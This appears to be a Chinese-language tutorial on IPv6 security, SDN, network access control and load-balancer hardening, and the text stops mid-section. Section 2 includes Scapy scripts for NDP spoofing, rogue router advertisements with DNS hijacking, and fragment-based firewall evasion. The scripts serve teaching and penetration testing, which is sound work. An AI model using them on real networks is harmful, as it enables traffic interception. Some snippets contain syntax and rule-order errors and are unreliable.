# IPv6安全与下一代网络技术

> 本文档系统讲解IPv6网络安全威胁与防护、SDN安全、网络访问控制（NAC）、负载均衡安全及零信任网络架构等下一代网络技术，涵盖原理分析、配置实践与渗透测试方法。

---

## 目录

1. [IPv6概述](#1-ipv6概述)
2. [IPv6安全威胁](#2-ipv6安全威胁)
3. [IPv6安全防护](#3-ipv6安全防护)
4. [SDN安全](#4-sdn安全)
5. [网络访问控制NAC](#5-网络访问控制nac)
6. [负载均衡安全](#6-负载均衡安全)
7. [零信任网络架构](#7-零信任网络架构)
8. [实战案例](#8-实战案例)

---

## 1. IPv6概述

### 1.1 IPv6地址结构

IPv6（Internet Protocol version 6）是为了解决IPv4地址枯竭问题而设计的下一代互联网协议。IPv6地址长度为128位（16字节），相比IPv4的32位地址空间，提供了约3.4×10^38个地址。

**IPv6地址格式：**

```
IPv6地址表示：2001:0db8:85a3:0000:0000:8a2e:0370:7334

简化规则：
1. 前导零省略：2001:db8:85a3:0:0:8a2e:370:7334
2. 连续零压缩：2001:db8:85a3::8a2e:370:7334（::只能出现一次）

地址结构：
├── 全球路由前缀（48位）：2001:0db8:85a3
├── 子网ID（16位）：0000
├── 接口标识符（64位）：0000:0000:8a2e:0370:7334
│
特殊地址：
├── ::1/128        — 回环地址（Loopback）
├── ::/0           — 默认路由
├── ::/128         — 未指定地址
├── fc00::/7       — 唯一本地地址（ULA，类似IPv4私有地址）
├── fe80::/10      — 链路本地地址（Link-Local）
├── ff00::/8       — 组播地址（Multicast）
└── 2001:db8::/32  — 文档保留地址
```

**IPv6地址分类：**

| 地址类型 | 前缀 | 说明 |
|---------|------|------|
| 全球单播地址（GUA） | 2000::/3 | 可在全球互联网路由 |
| 唯一本地地址（ULA） | fc00::/7 | 类似IPv4私有地址 |
| 链路本地地址（LLA） | fe80::/10 | 仅限本地链路通信 |
| 回环地址 | ::1/128 | 本机自测 |
| 未指定地址 | ::/128 | 未分配 |
| 组播地址 | ff00::/8 | 一对多通信 |
| 任播地址 | 无专用前缀 | 一对最近 |

### 1.2 与IPv4对比

| 特性 | IPv4 | IPv6 |
|------|------|------|
| 地址长度 | 32位（4字节） | 128位（16字节） |
| 地址数量 | 约43亿 | 约3.4×10^38 |
| 地址表示 | 点分十进制 | 冒号十六进制 |
| 报头长度 | 可变（20-60字节） | 固定40字节 + 扩展报头 |
| 分片 | 路由器和源端 | 仅源端（Path MTU Discovery） |
| 地址配置 | 手动或DHCP | SLAAC（无状态）/DHCPv6 |
| 广播 | 支持 | 取消（用组播替代） |
| IPSec | 可选 | 内置支持 |
| NAT | 普遍使用 | 理论上不需要 |
| QoS | TOS字段 | Traffic Class + Flow Label |
| ARP | 使用 | 取消（用NDP替代） |

### 1.3 IPv6报文结构

```
IPv6基本报头（40字节）：
┌──────────────────────────────────────────────────────────┐
│ Version(4) │ Traffic Class(8) │   Flow Label(20)        │
├────────────┼──────────────────┴────────────────────────┤
│ Payload Length(16) │ Next Header(8) │ Hop Limit(8)     │
├────────────────────┴─────────────────┴──────────────────┤
│                                                          │
│           Source Address (128 bits)                      │
│                                                          │
├──────────────────────────────────────────────────────────┤
│                                                          │
│      Destination Address (128 bits)                      │
│                                                          │
└──────────────────────────────────────────────────────────┘

扩展报头链（按顺序）：
  → Hop-by-Hop Options (Next Header = 0)
  → Routing (Next Header = 43)
  → Fragment (Next Header = 44)
  → Destination Options (Next Header = 60)
  → Authentication (AH, Next Header = 51)
  → Encapsulating Security Payload (ESP, Next Header = 50)
  → 上层协议（TCP/UDP/ICMPv6）
```

### 1.4 部署现状

截至2025年，全球IPv6部署率已超过40%，Google统计的IPv6用户占比已超过45%。主要推动因素包括：

- IPv4地址耗尽（特别是亚太和非洲地区）
- 移动运营商大规模部署IPv6（如T-Mobile USA几乎100% IPv6）
- 云服务提供商（AWS/Azure/GCP）全面支持IPv6
- 各国政府推动IPv6升级政策

中国IPv6部署在"深入推进IPv6规模部署行动计划"推动下快速增长，用户数已超过7亿。

---

## 2. IPv6安全威胁

### 2.1 NDP欺骗（Neighbor Discovery Protocol Spoofing）

NDP（邻居发现协议）是IPv6中替代ARP的协议，用于在同一链路上发现邻居和路由器。NDP使用ICMPv6消息：

- RS（Router Solicitation，路由器请求）
- RA（Router Advertisement，路由器通告）
- NS（Neighbor Solicitation，邻居请求）
- NA（Neighbor Advertisement，邻居通告）
- Redirect（重定向）

**NDP欺骗原理：**

与IPv4 ARP欺骗类似，攻击者伪造NA消息，声称自己拥有某个IPv6地址的MAC地址，从而导致流量被重定向。

```
攻击场景：中间人攻击

正常情况：
  Victim ──────────────────────── Router
  (2001:db8::100)               (2001:db8::1)

攻击后：
  Victim ────→ Attacker ────→ Router
  (2001:db8::100)  (2001:db8::999)  (2001:db8::1)

攻击步骤：
1. 攻击者发送伪造NA消息给Victim
   "2001:db8::1的MAC地址是 Attacker_MAC"
2. 攻击者发送伪造NA消息给Router
   "2001:db8::100的MAC地址是 Attacker_MAC"
3. 所有流量经过攻击者
```

**攻击工具实现（使用Scapy）：**

```python
from scapy.all import *
import time

# 目标和攻击者信息
victim_ip = "2001:db8::100"
victim_mac = "00:11:22:33:44:55"
router_ip = "2001:db8::1"
router_mac = "00:aa:bb:cc:dd:ee"
attacker_mac = "00:66:77:88:99:aa"

def ndp_spoof():
    """IPv6 NDP欺骗 - 冒充路由器"""
    while True:
        # 构造NA消息给受害者（声称自己是路由器）
        na_to_victim = (
            Ether(dst=victim_mac, src=attacker_mac) /
            IPv6(src=router_ip, dst=victim_ip) /
            ICMPv6ND NA(
                R=1,  # Router flag
                S=0,  # Solicited flag
                O=1,  # Override flag
            ) /
            ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)
        )

        # 构造NA消息给路由器（声称自己是受害者）
        na_to_router = (
            Ether(dst=router_mac, src=attacker_mac) /
            IPv6(src=victim_ip, dst=router_ip) /
            ICMPv6ND NA(R=0, S=0, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)
        )

        sendp(na_to_victim, verbose=0)
        sendp(na_to_router, verbose=0)

        print("[*] NDP spoof packets sent")
        time.sleep(2)

if __name__ == "__main__":
    ndp_spoof()
```

### 2.2 RA攻击（Router Advertisement Attack）

RA攻击是指攻击者在网络中发送伪造的路由器通告（RA）消息，使客户端将攻击者设为默认网关。

```
RA攻击场景：

1. 流量劫持：
   攻击者发送RA消息 → 客户端将攻击者设为默认网关
   → 所有外出流量经过攻击者

2. 拒绝服务：
   攻击者发送RA消息但不转发数据包
   → 客户端无法访问外部网络

3. DNS劫持：
   RA消息中包含RDNSS选项
   → 客户端使用攻击者的DNS服务器
```

**伪造RA消息攻击脚本：**

```python
from scapy.all import *

def rogue_ra_attack():
    """发送伪造RA消息"""
    # 攻击者信息
    attacker_mac = "00:66:77:88:99:aa"
    fake_prefix = "2001:db8:dead::"
    fake_dns = "2001:db8:dead::53"

    # 构造RA消息
    ra_packet = (
        Ether(src=attacker_mac, dst="33:33:00:00:00:01") /  # 组播地址
        IPv6(src="fe80::6677:88ff:fe99:aa",
             dst="ff02::1") /  # 所有节点组播
        ICMPv6ND RA(
            Hops=64,
            M=0,  # Managed address config
            O=1,  # Other config flag
            RouterLifetime=1800,
            ReachableTime=0,
            RetransTimer=0,
        ) /
        ICMPv6NDOptPrefixInfo(
            type=3,
            len=4,
            prefixlen=64,
            L=1,  # On-link
            A=1,  # Autonomous address config
            validlifetime=86400,
            preferredlifetime=14400,
            prefix=fake_prefix
        ) /
        ICMPv6NDOptRDNSS(
            type=25,
            len=1,
            lifetime=86400,
            dns=[fake_dns]
        ) /
        ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
    )

    sendp(ra_packet, loop=1, inter=3, verbose=1)

if __name__ == "__main__":
    rogue_ra_attack()
```

### 2.3 碎片攻击

IPv6的分片机制与IPv4不同，路由器不再分片，只有源端进行分片（通过Path MTU Discovery确定MTU）。分片信息包含在Fragment扩展报头中。

**碎片攻击类型：**

1. **碎片重叠攻击**：利用碎片偏移重叠，绕过防火墙检测
2. **碎片资源耗尽**：发送大量碎片包但不完成重组
3. **碎片绕过防火墙**：将攻击载荷分片，使防火墙无法检测完整内容

```python
from scapy.all import *

def ipv6_fragment_attack(target_ip):
    """IPv6碎片绕过防火墙攻击"""
    # 构造TCP SYN包并分片
    # 第一个碎片
    frag1 = (
        IPv6(dst=target_ip) /
        IPv6ExtHdrFragment(offset=0, m=1, id=0x1234) /
        TCP(dport=80, flags="S", seq=1000)[:16]  # 只取前16字节
    )

    # 第二个碎片（包含攻击载荷）
    frag2 = (
        IPv6(dst=target_ip) /
        IPv6ExtHdrFragment(offset=2, m=0, id=0x1234) /
        b"\x00\x00\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00"  # 剩余TCP头部
    )

    send(frag1)
    send(frag2)
    print(f"[*] Fragmented packets sent to {target_ip}")
```

### 2.4 隧道攻击

IPv6-over-IPv4隧道机制（如6to4、6rd、Teredo、ISATAP）可能被利用来绕过IPv4安全控制。

```
隧道攻击场景：

1. 绕过IPv4防火墙：
   攻击者 ←IPv6 over UDP→ Teredo服务器 ←IPv6→ 目标

2. 绕过NAT：
   内部主机通过ISATAP隧道访问外部IPv6网络
   → 绕过IPv4 NAT规则

3. 隐蔽通信：
   使用6to4隧道封装恶意流量
   → IPv4 IDS/IPS可能无法检测
```

**检测IPv6隧道：**

```bash
# 检查系统是否启用了IPv6隧道
ip -6 tunnel show
ip -6 addr show

# 检查Teredo
netsh interface teredo show state  # Windows
netsh interface ipv6 show teredo

# 检查ISATAP
netsh interface ipv6 show isatap

# Linux检查6to4
ip -6 route show | grep "::/96"
```

---

## 3. IPv6安全防护

### 3.1 SEND/CGA

SEND（SEcure Neighbor Discovery）是对NDP的安全增强，使用CGA（Cryptographically Generated Addresses）防止地址欺骗。

**CGA原理：**

```
CGA生成过程：
1. 选择Modifier（随机数，16字节）
2. 计算Hash：Hash1 = SHA1(Modifier || SubnetPrefix || Public Key)
3. 取Hash1的左59位（或更多）作为Interface ID
4. 设置U/L位为1（本地管理）
5. CGA地址 = SubnetPrefix || Interface ID

验证过程：
1. 接收者获取发送者的公钥和Modifier
2. 重新计算Hash1
3. 验证地址是否匹配
4. 验证NDP消息签名
```

**SEND配置（Cisco设备示例）：**

```
! 启用SEND/CGA
ipv6 cga rsakeypair key-name

! 配置CGA参数
ipv6 cga modifier rsakeypair key-name sec-level 1

! 接口配置
interface GigabitEthernet0/0/0
  ipv6 address 2001:db8::/64 cga key-name
  ipv6 nd secured
  ipv6 nd sec-level 1
  ipv6 nd cga rsakeypair key-name
!
```

> 注意：SEND在实际部署中非常少见，主要原因是配置复杂且性能开销大。多数环境使用RA Guard等其他防护措施替代。

### 3.2 RA Guard

RA Guard（Router Advertisement Guard）是交换机层面的防护机制，阻止非信任端口发送RA消息。

**Cisco RA Guard配置：**

```
! 定义RA Guard策略
ipv6 nd raguard policy RAGUARD_POLICY
  device-role host
  trusted-port no
  hop-limit maximum 64
  managed-config-flag off
  other-config-flag off
  router-preference maximum medium
!

! 应用到接入端口
interface GigabitEthernet0/1
  switchport mode access
  ipv6 nd raguard attach-policy RAGUARD_POLICY
!

! 信任上联端口
interface GigabitEthernet0/24
  switchport mode trunk
  ipv6 nd raguard attach-policy RAGUARD_POLICY
!
```

**华为设备RA Guard配置：**

```
# 使能RA Guard功能
ipv6 nd raguard enable

# 配置接口角色
interface GigabitEthernet0/0/1
  ipv6 nd raguard role access-port
#
interface GigabitEthernet0/0/24
  ipv6 nd raguard role trusted
#
```

**Linux主机RA Guard（使用ip6tables）：**

```bash
# 只允许来自路由器的RA
ip6tables -A INPUT -p icmpv6 --icmpv6-type router-advertisement \
  -m mac --mac-source 00:aa:bb:cc:dd:ee -j ACCEPT

# 拒绝其他所有RA
ip6tables -A INPUT -p icmpv6 --icmpv6-type router-advertisement \
  -j DROP

# 使用ndppd守护进程保护
# 安装并配置ndppd
apt install ndppd
```

### 3.3 DHCPv6-Shield

DHCPv6-Shield防止非授权DHCPv6服务器响应客户端请求。

```
! Cisco DHCPv6 Guard配置
ipv6 dhcp guard policy DHCPV6_POLICY
  device-role client
  trusted-port no
!

interface GigabitEthernet0/1
  ipv6 dhcp guard attach-policy DHCPV6_POLICY
!

interface GigabitEthernet0/24
  ipv6 nd raguard attach-policy RAGUARD_POLICY
  ipv6 dhcp guard attach-policy DHCPV6_POLICY
  ipv6 dhcp guard trusted-port
!
```

### 3.4 IPv6防火墙规则

**ip6tables防火墙规则集：**

```bash
#!/bin/bash
# IPv6防火墙基础规则

# 清除现有规则
ip6tables -F
ip6tables -X

# 默认策略
ip6tables -P INPUT DROP
ip6tables -P FORWARD DROP
ip6tables -P OUTPUT ACCEPT

# 1. 允许回环
ip6tables -A INPUT -i lo -j ACCEPT
ip6tables -A OUTPUT -o lo -j ACCEPT

# 2. 允许已建立连接
ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 3. 允许ICMPv6（必须！IPv6依赖ICMPv6运行）
ip6tables -A INPUT -p icmpv6 -j ACCEPT

# 4. 限制ICMPv6速率（防洪水攻击）
ip6tables -A INPUT -p icmpv6 -m limit --limit 10/sec --limit-burst 20 -j ACCEPT
ip6tables -A INPUT -p icmpv6 -j DROP

# 5. 阻止扩展报头滥用
# 阻止没有上层协议头且非分片的包
ip6tables -A INPUT -m u32 --u32 "0x4&0xff=0xff" -j DROP  # Next Header = No Next Header

# 6. 丢弃有Routing扩展头的包（源路由攻击）
ip6tables -A INPUT -m rt --rt-type 0 -j DROP

# 7. 限制分片包速率
ip6tables -A INPUT -m frag --fragmore -j DROP  # 阻止重叠分片
ip6tables -A INPUT -p tcp --fragment -m limit --limit 10/sec -j ACCEPT
ip6tables -A INPUT --fragment -j DROP

# 8. 允许SSH
ip6tables -A INPUT -p tcp --dport 22 -j ACCEPT

# 9. 允许HTTP/HTTPS
ip6tables -A INPUT -p tcp --dport 80 -j ACCEPT
ip6tables -A INPUT -p tcp --dport 443 -j ACCEPT

# 10. 记录被拒绝的连接
ip6tables -A INPUT -j LOG --log-prefix "IP6_DROP: " --log-level 6
ip6tables -A INPUT -j DROP

# 保存规则
ip6tables-save > /etc/iptables/rules.v6
```

**pfSense/OPNsense IPv6防火墙规则：**

```
# WAN入站规则
# 1. 允许ICMPv6（必须）
pass in on WAN inet6 proto ipv6-icmp all

# 2. 允许已建立连接
pass in on WAN inet6 proto {tcp,udp} from any to (WAN) \
  port {80,443} keep state

# 3. 阻止RA注入
block in on WAN inet6 proto ipv6-icmp \
  from any to ff02::1 ipv6-icmp-type router-advertisement

# LAN规则
# 4. 允许SLAAC和DHCPv6
pass in on LAN inet6 proto udp from any to fe80::/10 port {546,547}
```

---

## 4. SDN安全

### 4.1 SDN架构概述

SDN（Software-Defined Networking，软件定义网络）将网络控制平面与数据平面分离，通过集中式控制器管理网络转发行为。

```
SDN三层架构：

┌─────────────────────────────────────┐
│         应用层（Application Layer）    │
│  ┌─────────┐ ┌─────────┐ ┌────────┐ │
│  │负载均衡  │ │防火墙   │ │QoS     │ │
│  └─────────┘ └─────────┘ └────────┘ │
│         ↑ Northbound API ↑            │
├─────────────────────────────────────┤
│         控制层（Control Layer）       │
│  ┌─────────────────────────────────┐ │
│  │     SDN控制器（Controller）       │ │
│  │  ┌─────┐ ┌─────┐ ┌─────────┐  │ │
│  │  │拓扑 │ │路由 │ │流表管理  │  │ │
│  │  └─────┘ └─────┘ └─────────┘  │ │
│  └─────────────────────────────────┘ │
│         ↓ Southbound API ↓           │
├─────────────────────────────────────┤
│         数据层（Data Layer）          │
│  ┌────┐ ┌────┐ ┌────┐ ┌────┐ ┌────┐│
│  │SW1 │ │SW2 │ │SW3 │ │SW4 │ │SW5 ││
│  └────┘ └────┘ └────┘ └────┘ └────┘│
└─────────────────────────────────────┘
```

### 4.2 控制器安全

SDN控制器是整个网络的大脑，一旦被攻破，攻击者可以控制整个网络。

**控制器安全威胁：**

1. **未授权访问**：控制器API未做认证
2. **权限提升**：应用通过API获取超额权限
3. **DoS攻击**：大量流表请求导致控制器过载
4. **恶意应用**：SDN应用中植入恶意逻辑

**控制器安全防护：**

```python
# ONOS控制器安全配置示例

# 1. 访问控制
# org.onosproject.security配置
security {
    # 启用应用权限管理
    enabled: true
    # 应用权限白名单
    permissions {
        "org.onosproject.intent" {
            "READ": ["device", "host", "link", "topology"]
            "WRITE": ["flowrule", "intent"]
        }
    }
    # 禁止应用反射调用
    enforce: true
}

# 2. 速率限制
# 限制每个交换机的Packet-In速率
olt {
    packetInRate: 1000  # 每秒最大1000个Packet-In
    flowModRate: 500    # 每秒最大500个流表修改
}

# 3. 控制器自身安全
# 启用TLS
tls {
    enabled: true
    keyStore: "/etc/onos/keystore.jks"
    keyStorePassword: "changeit"
    trustStore: "/etc/onos/truststore.jks"
    trustStorePassword: "changeit"
}
```

**OpenDaylight安全配置：**

```xml
<!-- OpenDaylight AAA认证配置 -->
<feature-repository>
  <feature name="odl-aaa-shiro">
    <config>
      <shiro>
        <enabled>true</enabled>
        <sessionIdCookieName>JSESSIONID</sessionIdCookieName>
        <sessionTimeout>3600</sessionTimeout>
      </shiro>
      <users>
        <user>
          <name>admin</name>
          <password>{SHA}encrypted_password</password>
          <roles>admin</roles>
        </user>
      </users>
    </config>
  </feature>
</feature-repository>
```

### 4.3 南北向API安全

**北向API安全（控制器与应用之间）：**

```python
# REST API认证与授权
from flask import Flask, request, jsonify
import jwt
from functools import wraps

app = Flask(__name__)
SECRET_KEY = "your-secret-key"

# JWT认证装饰器
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'error': 'Token missing'}), 401

        try:
            data = jwt.decode(token.replace('Bearer ', ''),
                            SECRET_KEY, algorithms=['HS256'])
            request.user = data
        except jwt.ExpiredSignatureError:
            return jsonify({'error': 'Token expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 401

        return f(*args, **kwargs)
    return decorated

# 流表安装API
@app.route('/api/v1/flows', methods=['POST'])
@token_required
def install_flow():
    # 权限检查
    if request.user.get('role') != 'admin':
        return jsonify({'error': 'Permission denied'}), 403

    flow = request.json

    # 输入验证（防止注入）
    if not validate_flow(flow):
        return jsonify({'error': 'Invalid flow'}), 400

    # 速率限制
    if rate_limit_exceeded(request.user['id']):
        return jsonify({'error': 'Rate limit exceeded'}), 429

    result = install_flow_rule(flow)
    return jsonify(result), 201

# 输入验证函数
def validate_flow(flow):
    required = ['switch_id', 'match', 'actions']
    if not all(k in flow for k in required):
        return False
    # 验证switch_id格式
    if not re.match(r'^[a-f0-9:]{1,32}$', flow['switch_id']):
        return False
    # 验证match和actions不包含恶意内容
    if ';' in str(flow) or '|' in str(flow):
        return False
    return True
```

**南向API安全（控制器与交换机之间）：**

```
# OpenFlow TLS配置
# 控制器端（OVS示例）
ovs-vsctl set-manager ptcp:6640
ovs-vsctl set-manager ssl:0.0.0.0:6653

# 配置证书
ovs-vsctl set-ssl /etc/openvswitch/ctl-privkey.pem \
                   /etc/openvswitch/ctl-cert.pem \
                   /etc/openvswitch/cacert.pem

# 交换机端配置
ovs-vsctl set-controller br0 \
  ssl:192.168.1.100:6653 \
  --certificate=/etc/openvswitch/sc-cert.pem \
  --private-key=/etc/openvswitch/sc-privkey.pem \
  --ca-cert=/etc/openvswitch/cacert.pem

# 流表安全规则
# 限制控制器可安装的流表优先级范围
ovs-vsctl set bridge br0 \
  flow-limit=1000 \
  flow-table-miss-handling=true
```

### 4.4 流表安全

流表是SDN交换机的转发规则，攻击者可能通过注入恶意流表规则来劫持流量。

**流表攻击场景：**

```
1. 流表泛洪攻击：
   攻击者通过控制器安装大量流表规则
   → 交换机TCAM溢出 → 正常流表被驱逐

2. 流表劫持：
   安装高优先级恶意流表规则
   → 将流量重定向到攻击者

3. 流表时序攻击：
   利用流表超时时间差异
   → 在规则过期后劫持流量
```

**流表安全防护策略：**

```python
# 流表安全验证模块

class FlowTableValidator:
    def __init__(self):
        self.max_flows_per_switch = 1000
        self.max_flows_per_tenant = 100
        self.allowed_match_fields = [
            'in_port', 'eth_src', 'eth_dst',
            'ipv4_src', 'ipv4_dst',
            'ipv6_src', 'ipv6_dst',
            'tcp_src', 'tcp_dst',
            'udp_src', 'udp_dst'
        ]
        self.blocked_actions = [
            'output:CONTROLLER',  # 阻止转发到控制器（防止packet-in攻击）
        ]

    def validate_flow(self, flow, tenant_id, switch_id):
        """验证流表规则安全性"""
        # 1. 检查流表数量限制
        if self.get_flow_count(switch_id) >= self.max_flows_per_switch:
            return False, "Flow table full"

        if self.get_tenant_flow_count(tenant_id, switch_id) >= self.max_flows_per_tenant:
            return False, "Tenant flow limit exceeded"

        # 2. 验证match字段
        for field in flow.get('match', {}):
            if field not in self.allowed_match_fields:
                return False, f"Field {field} not allowed"

        # 3. 验证action安全性
        for action in flow.get('actions', []):
            if any(blocked in str(action) for blocked in self.blocked_actions):
                return False, f"Blocked action: {action}"

            # 检查output端口是否合法
            if action.startswith('output:'):
                port = action.split(':')[1]
                if not self.is_valid_port(switch_id, port):
                    return False, f"Invalid port: {port}"

        # 4. 检查优先级范围
        priority = flow.get('priority', 0)
        if priority > 100 or priority < 0:
            return False, "Priority out of range"

        # 5. 检查超时设置
        idle_timeout = flow.get('idle_timeout', 0)
        hard_timeout = flow.get('hard_timeout', 0)
        if idle_timeout == 0 and hard_timeout == 0:
            return False, "Must have timeout"

        return True, "Valid"

    def detect_flow_injection(self, switch_id):
        """检测异常流表注入"""
        # 统计最近1分钟新增流表数
        recent_flows = self.get_recent_flows(switch_id, window=60)
        if len(recent_flows) > 50:  # 每分钟超过50条
            # 触发告警
            self.alert("Possible flow injection attack", switch_id)
            return True

        # 检测异常模式
        for flow in recent_flows:
            # 检测全通配流表（转发所有流量）
            if self.is_wildcard_flow(flow):
                self.alert("Wildcard flow detected", switch_id, flow)
            # 检测镜像端口流表
            if self.is_mirror_flow(flow):
                self.alert("Mirror flow detected", switch_id, flow)

        return False
```

---

## 5. 网络访问控制NAC

### 5.1 802.1X认证

802.1X是IEEE定义的网络访问控制标准，基于端口认证实现对网络访问的控制。它在设备接入网络时进行身份验证，只有认证通过的设备才能访问网络资源。

**802.1X架构组件：**

```
802.1X认证流程：

┌──────────┐         ┌──────────┐         ┌──────────┐
│  Supplicant │ ←──EAP──→ │  Authenticator│ ←──RADIUS──→ │  Authentication │
│  (客户端)   │         │  (交换机/AP)   │         │  Server(RADIUS) │
└──────────┘         └──────────┘         └──────────┘

认证流程：
1. 客户端连接交换机端口
2. 交换机端口处于未授权状态（只能发EAP包）
3. 交换机发送EAP-Request/Identity
4. 客户端回EAP-Response/Identity（用户名）
5. 交换机转发给RADIUS服务器
6. RADIUS选择认证方法（EAP-TLS/PEAP/MSCHAPv2）
7. 双方完成认证交互
8. RADIUS返回Accept/Reject
9. 交换机开放端口或保持关闭
```

**Cisco 802.1X配置：**

```
! 全局配置
aaa new-model
aaa authentication dot1x default group radius
aaa authorization network default group radius
aaa accounting dot1x default start-stop group radius

! RADIUS服务器配置
radius server ISE_SERVER
  address ipv4 10.1.1.100 auth-port 1812 acct-port 1813
  key 7 StrongSharedSecret123
  timeout 5
  retransmit 3

! 启用Dot1x
dot1x system-auth-control

! 接口配置
interface GigabitEthernet0/1
  switchport mode access
  switchport access vlan 100
  authentication port-control auto
  dot1x pae authenticator
  dot1x timeout quiet-period 10
  dot1x timeout tx-period 5
  dot1x max-req 3
  dot1x max-reauth-req 2

  ! Guest VLAN（认证失败的访客VLAN）
  dot1x guest-vlan 200

  ! Critical VLAN（RADIUS不可达时的VLAN）
  authentication event server dead action authorize vlan 300

  ! MAC旁路（非802.1X设备）
  dot1x mac-auth-bypass

  ! 端口安全
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation restrict
!
```

### 5.2 终端安全检查

NAC通常结合终端安全检查，确保接入设备满足安全基线要求（如防病毒软件安装、系统补丁更新等）。

**Cisco ISE终端安全检查配置：**

```xml
<!-- ISE Posture Policy -->
<posture-policy>
  <name>Corporate_Standard_Posture</name>
  <conditions>
    <!-- 防病毒软件检查 -->
    <condition name="AV_Installed">
      <type>file</type>
      <check>
        <path>C:\Program Files\Antivirus\av.exe</path>
        <must-exist>true</must-exist>
      </check>
    </condition>

    <!-- 系统补丁检查 -->
    <condition name="Patch_Level">
      <type>registry</type>
      <check>
        <key>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate</key>
        <value>LastUpdate</value>
        <min-days-ago>30</min-days-ago>
      </check>
    </condition>

    <!-- 防火墙启用检查 -->
    <condition name="Firewall_Enabled">
      <type>service</type>
      <check>
        <service>MpsSvc</service>
        <must-be-running>true</must-be-running>
      </check>
    </condition>
  </conditions>

  <actions>
    <on-success>
      <assign-vlan>100</assign-vlan>
      <download-acl>permit_any</download-acl>
    </on-success>
    <on-failure>
      <assign-vlan>200</assign-vlan>
      <redirect-url>https://ise.example.com/remediation</redirect-url>
    </on-failure>
  </actions>
</posture-policy>
```

### 5.3 准入控制

准入控制是基于认证结果和终端安全检查结果，动态分配网络访问权限的机制。

```
准入控制策略矩阵：

┌────────────────┬────────────────┬────────────────┬──────────┐
│ 设备类型        │ 认证状态        │ 安全检查       │ VLAN分配 │
├────────────────┼────────────────┼────────────────┼──────────┤
│ 企业PC          │ 802.1X认证通过 │ 通过           │ VLAN 100  │
│ 企业PC          │ 802.1X认证通过 │ 不通过         │ VLAN 200  │
│ 企业PC          │ 认证失败       │ -              │ VLAN 300  │
│ 访客设备        │ Web认证通过    │ -              │ VLAN 400  │
│ IP电话          │ MAB认证通过    │ -              │ VLAN 500  │
│ 摄像头          │ MAB认证通过    │ -              │ VLAN 600  │
│ 未知设备        │ 无认证         │ -              │ VLAN 999  │
└────────────────┴────────────────┴────────────────┴──────────┘
```

### 5.4 动态VLAN分配

通过RADIUS返回VLAN属性，实现基于认证结果的动态VLAN分配：

```
! FreeRADIUS用户配置（动态VLAN）

# /etc/freeradius/3.0/mods-config/files/authorize

# 企业员工 - 完全访问
user1 Cleartext-Password := "password123"
    Tunnel-Type = 13,
    Tunnel-Medium-Type = 6,
    Tunnel-Private-Group-Id = "100"

# 不合规设备 - 隔离VLAN
user2 Cleartext-Password := "password456"
    Tunnel-Type = 13,
    Tunnel-Medium-Type = 6,
    Tunnel-Private-Group-Id = "200"

# 访客 - 访客VLAN
guest_user Cleartext-Password := "guest"
    Tunnel-Type = 13,
    Tunnel-Medium-Type = 6,
    Tunnel-Private-Group-Id = "400"
    Session-Timeout = 3600,
    Idle-Timeout = 600
```

**基于MAC地址的设备识别（MAB）：**

```
! 交换机配置MAB
interface GigabitEthernet0/1
  switchport mode access
  mab
  dot1x pae authenticator
  dot1x mac-auth-bypass
  dot1x timeout server-timeout 10
  authentication port-control auto
  authentication order mab dot1x
  authentication priority dot1x mab
!

! FreeRADIUS MAC地址白名单
# 打印机MAC地址
001122334455 User-Password == "001122334455"
    Tunnel-Type = 13,
    Tunnel-Medium-Type = 6,
    Tunnel-Private-Group-Id = "700"

# IP电话MAC地址
0066778899AA User-Password == "0066778899AA"
    Tunnel-Type = 13,
    Tunnel-Medium-Type = 6,
    Tunnel-Private-Group-Id = "500"
```

---

## 6. 负载均衡安全

### 6.1 四层负载均衡

四层负载均衡基于IP和端口信息进行流量分发，不解析应用层协议。常见工具包括LVS、HAProxy（TCP模式）、AWS NLB。

**LVS安全配置：**

```bash
# LVS + Keepalived高可用配置
# /etc/keepalived/keepalived.conf

global_defs {
    router_id LVS_MASTER
}

vrrp_instance VI_1 {
    state MASTER
    interface eth0
    virtual_router_id 51
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass StrongVRRPPass123
    }
    virtual_ipaddress {
        192.168.1.100/24
    }
}

# 四层负载均衡
virtual_server 192.168.1.100 443 {
    delay_loop 6
    lb_algo rr                    # 轮询算法
    lb_kind DR                    # 直接路由模式
    protocol TCP
    persistence_timeout 50        # 会话保持

    # SYN洪水防护
    inhibit_on_failure

    real_server 192.168.1.101 443 {
        weight 1
        TCP_CHECK {
            connect_port 443
            connect_timeout 3
            nb_get_retry 3
            delay_before_retry 3
        }
    }

    real_server 192.168.1.102 443 {
        weight 1
        TCP_CHECK {
            connect_port 443
            connect_timeout 3
            nb_get_retry 3
            delay_before_retry 3
        }
    }
}
```

### 6.2 七层负载均衡

七层负载均衡解析HTTP/HTTPS协议，可以基于URL、Header、Cookie等进行路由分发。HAProxy和Nginx是最常用的七层负载均衡器。

**HAProxy安全配置：**

```haproxy
# /etc/haproxy/haproxy.cfg

global
    log 127.0.0.1 local0
    maxconn 100000
    user haproxy
    group haproxy
    daemon

    # SSL配置
    tune.ssl.default-dh-param 2048
    ssl-default-bind-ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
    ssl-default-bind-options no-sslv3 no-tlsv10 no-tlsv11 no-tls-tickets

defaults
    log global
    mode http
    option httplog
    option dontlognull
    timeout connect 5s
    timeout client 50s
    timeout server 50s

# SSL卸载前端
frontend https_front
    bind *:443 ssl crt /etc/haproxy/certs/server.pem alpn h2,http/1.1

    # HTTP头安全加固
    http-response set-header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    http-response set-header X-Frame-Options DENY
    http-response set-header X-Content-Type-Options nosniff
    http-response set-header X-XSS-Protection "1; mode=block"
    http-response set-header Content-Security-Policy "default-src 'self'"

    # 速率限制
    rate-limit sessions 100
    rate-limit http-request 50

    # DDoS防护
    stick-table type ip size 1m expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny if { sc_http_req_rate(0) gt 20 }

    # SQL注入检测
